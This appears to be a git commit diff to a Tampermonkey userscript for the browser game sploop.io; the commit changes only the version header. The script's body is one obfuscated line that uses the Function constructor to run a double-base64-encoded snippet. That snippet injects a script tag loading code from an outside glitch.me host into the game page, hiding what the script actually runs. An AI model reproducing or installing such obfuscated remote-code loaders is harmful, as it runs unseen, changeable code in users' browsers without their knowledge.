dae758c200dc3c7f2d9ff99caf9e222624ea7210
mini-programmer <69440217+mini-programmer@users.noreply.github.com>
2022-04-15 14:29:55 -0300

    another

--- code.js
+++ code.js
@@ -1,13 +1,12 @@
 // ==UserScript==
 // @name         Better Sploop Script
 // @namespace    http://tampermonkey.net/
-// @version      1.1.1
+// @version      See in game
 // @description  Does some things, see them in the game!
 // @author       Mini Scripter
 // @match        http*://sploop.io/*
 // @grant        none
 // @license      GNU GPLv3
-/* jshint esversion:6 */
 // ==/UserScript==
 let a='constructor';
 a[a][a](atob('bGV0IGVsZW1lbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTtlbGVtZW50LnNyYyA9IGF0b2IoJ2FIUjBjSE02THk5elkzSnBjSFJsY2kxamIyUmxjeTVuYkdsMFkyZ3ViV1V2UVhWMGIxVndaR0YwWlZOd2JHOXZjRlJvYVc1bmN5NXFjdz09Jyk7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChlbGVtZW50KQo='))();
